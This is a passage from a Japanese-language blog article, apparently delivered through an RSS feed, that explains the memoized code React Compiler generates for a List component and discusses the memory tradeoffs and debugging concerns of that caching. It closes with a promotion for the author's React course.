    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>

      $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">const</span> listItems <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!==</span> listItems<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>listItems<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> listItems<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これが新しく書き直されたList関数です。かなりの情報量なので、少し分解して説明します。</p>
<p>冒頭に次の行があります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>この<code class="language-text">_c</code>関数（"c"は「キャッシュ」を表します）は、Hooksを使用して保存される配列を作成します。React Compilerは<code class="language-text">Link</code>関数を解析し、パフォーマンスを最大限に高めるには6つのものを保存する必要があると判断したのです。最初に関数が呼び出されたとき、その6つのものの結果を配列に保存します。</p>
<p>次に関数が呼び出されたときにはキャッシュが使われます。例として、<code class="language-text">processItems</code>を呼び出す部分を見てみましょう。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
        $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>関数の呼び出しと<code class="language-text">li</code>の生成の両方を含む、<code class="language-text">processItems</code>に関するすべての処理がラップされた状態で、配列で2番目のキャッシュ（<code class="language-text">$[1]</code>）が、前回関数が呼び出されたときと同じ入力値かどうかを確認します（<code class="language-text">List</code>に渡される<code class="language-text">items</code>の値）。</p>
<p>同じであれば、キャッシュ配列で3番目の位置（<code class="language-text">$[2]</code>）が使われます。<code class="language-text">items</code>のマッピングが完了すると、生成されたすべての<code class="language-text">li</code>のリストが保存されます。React Compilerのコードはこう言っているのです。「前回この関数を呼び出したときと同じアイテムのリストを渡してくれたら、前回キャッシュに保存した<code class="language-text">li</code>のリストをあげます。」</p>
<p>前回と違う<code class="language-text">items</code>を渡すと、<code class="language-text">processItems</code>を呼び出します。その場合でも、リストの中の個々のアイテムについての情報をキャッシュに保存します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">t3 = </code>の行をご覧ください。<code class="language-text">li</code>を返すアロー関数を再度作成するのではなく、キャッシュ配列で4番目の位置（<code class="language-text">$[3]</code>）に関数自体を保存しています。これにより、JavaScriptエンジンは次に<code class="language-text">List</code>が読み出されたときにこの関数を作成する必要がなくなります。この関数は決して変わることがないため、最初のif文は基本的にこう言っています。「キャッシュ配列のこの場所が空いているならキャッシュしてください。空いていなければキャッシュから取得してください。」</p>
<p>このようにして、Reactは自動的に値をキャッシュし、関数の結果をメモ化します。Reactが出力するコードは我々が書いたコードと機能は同じですが、これらの値をキャッシュするためのコードを含んでおり、Reactが繰り返し関数を呼び出すことでパフォーマンスが損なわれないようにしています。</p>
<p>ただし、React Compilerのキャッシュは開発者が一般的にメモ化で行うキャッシュよりも詳細であり、しかも自動的にこれを行っています。つまり、開発者は手動で依存関係やメモ化を管理する必要がないのです。コードさえ書けば、React Compilerがそれをもとに新しいコードを生成し、キャッシュを利用することで高速化も実現してくれます。</p>
<p>React CompilerがまだJSXを生成していることも言っておくべきでしょう。実際に実行されるコードは、JSXのトランスパイルを行った上でReact Compilerが生成したものです。</p>
<p>JavaScriptエンジンで実際に実行される（ブラウザに送られるか、サーバー上で実行される）<code class="language-text">List</code>関数は、次のようなものです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter">t0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span>
    items
  <span class="token punctuation">}</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t1<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function-variable function">t3</span> <span class="token operator">=</span> <span class="token parameter">item</span> <span class="token operator">=></span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> item
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    t2 <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t2 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">const</span> listItems <span class="token operator">=</span> t2<span class="token punctuation">;</span>
  <span class="token keyword">let</span> t3<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!==</span> listItems<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> listItems
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> listItems<span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> t3<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t3 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> t3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>React Compilerは、値をキャッシュするための配列と、そのために必要なすべてのif文を追加しました。JSXトランスパイラはJSXをネストされた関数に変換しました。あなたが書いたコードとJavaScriptエンジンが実行するコードの間には大きな違いがあります。つまり、他人が書いたコードが、自分が当初意図したとおりのものを生成してくれることを信用する必要があります。</p>
<h2>CPUの命令サイクルとデバイスメモリのトレードオフ</h2>
<p>メモ化とキャッシュは、大まかに言うとメモリを犠牲にしてCPUへの負荷を軽減することを意味します。CPUがパフォーマンスコストの高い演算を行わなくて済む代わりに、メモリ容量を消費してデータを保存しているのです。</p>
<p>React Compilerを使用するということは、デバイスのメモリ上にできるだけデータを保存するということです。ユーザーデバイスのブラウザ上でコードを実行する場合、この点はアーキテクチャの面で意識する必要があります。</p>
<p>多くのReactアプリでは大きな問題にならないでしょう。しかし、アプリ上で大量のデータを扱う場合、実験ステージを経たReact Compilerを使うのであれば、少なくともデバイスメモリが使用されることを意識し、メモリの使用状況を注視する必要があるでしょう。</p>
<h2>抽象化とデバッグ</h2>
<p>形式を問わず、コンパイルはすべて自分が書いたコードと実際に実行されるコードの間の抽象化レイヤーに相当します。</p>
<p>この記事で説明したように、React Compilerの場合、実際にブラウザに送られるコードの内容を理解するためには、自分のコードをReact Compilerにかけて、生成されたコードをJSXトランスパイラにかけてみる必要があります。</p>
<p>コードに抽象化レイヤーを加えることにはデメリットもあります。デバッグが難しくなる場合があるのです。だからと言って使用を避けた方がいいというわけではありませんが、デバッグ対象のコードは自分が書いたものだけではなく、ツールが生成したものだということは頭に入れておく必要があります。</p>
<p>抽象化レイヤーから生成されたコードをデバッグする上では、抽象化について正確なメンタルモデルを持っておくことが成果を大きく左右します。React Compilerの仕組みを完全に理解することで、生成されたコードをデバッグできるようになり、ストレスなく開発作業を行えるようになるでしょう。</p>
<h2>さらに深く掘り下げる</h2>
<p>このブログ記事が有益だと感じていただけたなら、筆者が提供している<a href="https://understandingreact.com/">Understanding React</a>というコースもぜひご検討ください。計16.5時間にわたり、Reactのあらゆる機能について同様に深く掘り下げています。生涯にわたるアクセス権とすべてのソースコード、修了証が得られます。</p>
<p>筆者はReactのソースコードも、React Compilerのソースコードも、すべて読みました。なぜかと言うと、Reactの仕組みを内部実装レベルから説明できるようにするためです。</p>
<p>React自体は、Webを基礎とし、その上に構築された大きな抽象化レイヤーです。抽象化ではよくあることですが、Reactを使用する開発者のほとんどは、その仕組みについて正確なメンタルモデルを持っていません。それが、Reactベースのアプリケーションをビルドし、デバッグする上で大きな影響を及ぼしています。しかし、Reactについて深く理解することは可能です。</p>
<p>React 19の機能とReact Compilerに関する新しい内容を近々コースに追加する予定です。すでに受講されている方は無料でご利用いただけます。<a href="https://understandingreact.com/">コースの方もぜひチェックしてみてください</a>。最初の6時間分の内容は、筆者のYouTubeチャンネルで無料公開しています。以下がその動画です。</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/-XKvVyC6si0" title="Understanding React: The First 6 Hours" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
<p>単に誰かが書いたコードをまねするだけではなく、自分の仕事を本当の意味で理解する旅に、一緒に出かけてみませんか？
-- トニー</p>]]></content:encoded></item></channel></rss>